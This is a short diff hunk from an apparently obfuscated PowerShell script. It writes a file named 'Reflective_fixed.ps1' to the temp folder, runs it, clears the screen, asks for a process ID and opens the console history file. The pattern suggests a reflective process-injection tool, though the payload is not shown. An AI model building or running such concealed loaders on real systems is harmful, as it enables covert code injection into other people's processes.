@@ -40,7 +40,7 @@ $_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
 $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
 . $_0xC11
-
+cls
 $_0x2AA = Read-Host (@("Enter"," PID") -join "")
 
 start $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
